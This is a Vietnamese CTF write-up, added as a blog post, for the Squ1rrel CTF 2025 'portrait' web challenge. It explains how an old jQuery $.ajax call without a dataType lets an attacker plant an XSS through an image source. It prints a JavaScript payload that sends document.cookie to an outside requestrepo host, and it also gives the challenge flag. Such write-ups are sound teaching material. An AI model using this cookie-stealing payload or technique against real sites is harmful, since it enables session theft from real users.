@@ -1,0 +1,72 @@
+---
+layout: single
+title: "portrait"
+date: 2025-04-24 16:00:00 +0700
+categories: [Squ1rrel-CTF-2025]
+tags: [CTF, Web, XSS]
+---
+# [web] portrait - web
+
+> Tên : portrait
+> Description: It's like DeviantArt, but with a report button to keep it less Deviant. Reporting a gallery will make the admin bot visit it.
+> Có source code.
+
+## Phân tích
+Mục tiêu là trigger XSS để lấy cookie của bot.
+
+Phân tích source code:
+```javascript
+$.ajax({
+                    url: "/api/portraits/" + username,
+                    type: "GET",
+                    success: function (data) {
+                        data.forEach((portrait) => {
+                            const col = $("<div>").addClass("col-md-4 mb-4");
+                            const card = $("<div>").addClass("card shadow-sm");
+                            const img = $("<img>").addClass("card-img-top").attr("src", portrait.source).attr("alt", portrait.name);
+                            const cardBody = $("<div>").addClass("card-body text-center");
+                            const title = $("<h5>").addClass("card-title").text(portrait.name);
+
+                            img.on("error", (e) => {
+                                $.get(e.currentTarget.src).fail((response) => {
+                                    if (response.status === 403) {
+                                        $(e.target).attr("src", "https://cdn.pixabay.com/photo/2021/08/03/06/14/lock-6518557_1280.png");
+                                    } else {
+                                        $(e.target).attr(
+                                            "src",
+                                            "https://cdn.pixabay.com/photo/2024/02/12/16/05/siguniang-mountain-8568913_1280.jpg"
+                                        );
+                                    }
+                                });
+                            });
+
+                            cardBody.append(title);
+                            card.append(img).append(cardBody);
+                            col.append(card);
+                            $("#portraitsContainer").append(col);
+                        });
+                    },
+                });
+```
+Nhờ vào tính năng scan của Burp ta phát hiện phiên bản `jquery 1.81.min` mà target sử dụng có [CVE](https://www.cvedetails.com/cve/CVE-2015-9251/).
+Khi dùng `$.ajax()` mà không khai báo dataType, jQuery sẽ đoán kiểu dữ liệu trả về.
+Vậy nên ta chỉ cần host javascript ở `http://<link_webhook>/payload.js` và gán vào source là có thể trigger được XSS.
+## Exploit
+Host javascript ở requestrepo:
+```javascript
+(function(){
+    fetch('https://pw4jtjtt.requestrepo.com/?flag=' + document.cookie);
+})();
+```
+POST Portraits:
+![](http://note.bksec.vn/pad/uploads/4b9109d9-18b3-4a07-a64c-84f0199c2173.png)
+
+
+Gửi url cho bot và lấy flag:
+![](http://note.bksec.vn/pad/uploads/8ce10d53-140e-41e3-b925-1b5477839d0c.png)
+
+> Flag:squ1rrel{unc_s747us_jqu3ry_l0wk3y_take_two_new_flag_check_this_out_guys} 
+
+
+
+
